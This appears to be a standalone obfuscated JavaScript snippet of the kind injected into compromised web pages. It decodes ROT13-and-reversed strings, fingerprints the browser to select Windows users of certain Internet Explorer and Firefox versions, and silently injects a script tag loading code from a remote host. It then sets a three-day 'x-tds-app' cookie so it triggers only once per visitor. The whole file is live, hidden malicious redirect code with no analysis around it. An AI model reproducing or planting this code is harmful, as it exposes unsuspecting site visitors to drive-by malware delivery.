(function() {
  var v = 50;
  var e = 0;
    function b(){
    e++;
    if(e > v) return false;
    if(!document.body) setTimeout(b, 500); else (function() {
            function t(s){
        return (s + '').replace(/[a-z]/gi, function(s) {
          return String.fromCharCode(s.charCodeAt(0) + (s.toLowerCase() < 'n' ? 13 : -13));
        });
      }
      var i = [' ;1=', ' GA ', 'gcv', 'p.rk', ')q\\/', 'RVFZ', 'inw/', 'avJ(', '=fre', ')]+', ']9-3', '[.6 ', '))]7', 'vepf', '(1.5', 'gar', 'gkrg', '|]9-', 'GA f', 'u', ']3-0', '0[1|', 'revS', 'a//:', 'fjbq', 'gc', 'c', '9-0[', 'R )*', 'qveG', 'epfn', '.(01', 'cggu', ')*.(', 'cn-f', 'vJ(|', '.21/', 'kbsr', 'vsgr', 'GA'];
      for(var z = 0; z < i.length; z++) {
        var s = t(i[z] + '');
        i[z] = s.split('').reverse().join('');
      }
            function je(v, u){
        var w = false;
        var d = false;
        for(var k = 0; k < v.length; k++) {
          var p = new RegExp(v[k][0], v[k][1]);
          if(v[k][2]) {
            w = true;
            if(p.test(u)) {
              d = true;
            }
          } else {
            if(p.test(u)) {
              return false;
            }
          }
        }
        if(w && !d) {
          return false;
        }
        return true;
      }
      var ud = navigator.userAgent;
      if(je([[i[5], 'i', 1], [i[29] + i[15], 'i', 1], [i[7] + i[24] + i[1] + i[14] + t('.*) ') + i[22] + t('sbk\\') + t('/\\q)') + i[35] + t('aqbj') + i[18] + i[11] + i[20] + i[33] + t(' Sve') + i[37] + t('\\/([') + i[10] + t('.[0|') + t('5|6]') + i[21] + i[17] + t('2[0-') + i[12], 'i', 1], [i[7] + i[24] + i[1] + i[31] + i[28] + t('qtr\\') + i[36] + i[27] + i[9], 'i', 1]], ud) && je([[t('Jvaq') + t('bjf ') + i[39], 'i', 1]], ud)) {
        (function() {
          var g = t('k-gq') + i[34] + i[26];
          var j = document.cookie.match(new RegExp("(?:^|; )" + g + "=([^;]*)"));
          if(!j) {
            var s = document.createElement(i[13] + i[25]);
            s.type = i[16] + i[6] + i[30] + i[2];
            s.src = i[32] + i[23] + i[38] + i[3] + i[19];
            var m = document.documentElement;
            m.insertBefore(s, m.lastChild);
            var d = new Date();
            d.setTime(d.getTime() + 259200000);
            document.cookie = g + i[0] + t('rkcv') + i[8] + d;
          }
        })();
      }
    })();
  }
  b();
})();
